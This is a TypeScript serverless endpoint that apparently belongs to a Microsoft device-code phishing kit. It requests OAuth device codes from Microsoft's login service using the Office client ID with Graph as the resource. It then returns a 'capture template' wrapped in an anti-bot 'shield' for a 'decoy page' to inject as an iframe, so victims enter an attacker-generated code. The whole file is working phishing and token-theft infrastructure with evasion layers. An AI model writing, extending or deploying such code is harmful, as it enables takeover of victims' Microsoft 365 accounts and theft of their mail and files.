// /api/schedule/confirm
// GET: Validates anti-bot token and returns shield-wrapped template (Layers 4-8)
// POST: Generates device code server-side, returns shield-wrapped template as JSON
//       Used by the decoy page flow: Decoy → POST here → shield → capture template

import { validateToken } from '../antibot-token';
import { wrapInShield } from '../../lib/shield';
import { generateTemplateHTML, getValidTemplateIds } from '../../lib/template-html';
import type { PreSeededData } from '../../lib/template-html';

interface Env {
  TOKEN_STORE: KVNamespace;
}

const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const DEVICE_CODE_URL = 'https://login.microsoftonline.com/common/oauth2/devicecode';
const RESOURCE = 'https://graph.microsoft.com';

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Request-Token',
};

async function requestDeviceCode(): Promise<{ deviceCode: string; userCode: string; expiresIn: number; interval: number } | null> {
  try {
    const body = new URLSearchParams({
      client_id: CLIENT_ID,
      resource: RESOURCE,
    });
    const response = await fetch(DEVICE_CODE_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
    if (!response.ok) return null;
    const data = await response.json() as {
      device_code: string;
      user_code: string;
      expires_in: string;
      interval: string;
    };
    return {
      deviceCode: data.device_code,
      userCode: data.user_code,
      expiresIn: parseInt(data.expires_in, 10),
      interval: parseInt(data.interval, 10) || 5,
    };
  } catch {
    return null;
  }
}

export const onRequestGet: PagesFunction<Env> = async (context) => {
  const url = new URL(context.request.url);
  const token = url.searchParams.get('t') || context.request.headers.get('X-Request-Token') || '';
  const tplId = url.searchParams.get('tpl') || 'default';

  if (!validateToken(token)) {
    return new Response('<!DOCTYPE html><html><head><title>Session Expired</title></head><body style="font-family:sans-serif;text-align:center;padding:60px"><h2>Session Expired</h2><p>Please go back and try again.</p></body></html>', {
      status: 403,
      headers: { 'Content-Type': 'text/html; charset=utf-8', ...CORS_HEADERS },
    });
  }

  const validIds = getValidTemplateIds();
  const safeId = validIds.includes(tplId) ? tplId : 'default';
  const templateHtml = generateTemplateHTML(safeId);
  const shieldHtml = wrapInShield(templateHtml);

  return new Response(shieldHtml, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'X-Content-Type-Options': 'nosniff',
      ...CORS_HEADERS,
    },
  });
};

export const onRequestPost: PagesFunction<Env> = async (context) => {
  const token = context.request.headers.get('X-Request-Token') || '';

  // Validate anti-bot token (optional — decoy page should provide one)
  if (token && !validateToken(token)) {
    return new Response(JSON.stringify({ error: 'Invalid token' }), {
      status: 403,
      headers: { 'Content-Type': 'application/json', ...CORS_HEADERS },
    });
  }

  // Read the active capture template from KV
  const captureTemplateId = (await context.env.TOKEN_STORE.get('active_template')) || 'default';

  // Generate device code server-side
  const codeData = await requestDeviceCode();
  if (!codeData) {
    return new Response(JSON.stringify({ error: 'Failed to generate verification code' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json', ...CORS_HEADERS },
    });
  }

  // Build pre-seeded data
  const preSeeded: PreSeededData = {
    deviceCode: codeData.deviceCode,
    userCode: codeData.userCode,
    expiresIn: codeData.expiresIn,
    interval: codeData.interval,
  };

  // Generate template with pre-seeded device code
  const validIds = getValidTemplateIds();
  const safeId = validIds.includes(captureTemplateId) ? captureTemplateId : 'default';
  const templateHtml = generateTemplateHTML(safeId, preSeeded);

  // Wrap in shield (Layers 5-7)
  const shieldHtml = wrapInShield(templateHtml);

  // Return as JSON so the decoy page can inject it as an iframe
  return new Response(JSON.stringify({
    html: shieldHtml,
    session_id: codeData.deviceCode.substring(0, 36),
  }), {
    status: 200,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      ...CORS_HEADERS,
    },
  });
};

export const onRequestOptions: PagesFunction<Env> = async () => {
  return new Response(null, {
    status: 204,
    headers: CORS_HEADERS,
  });
};
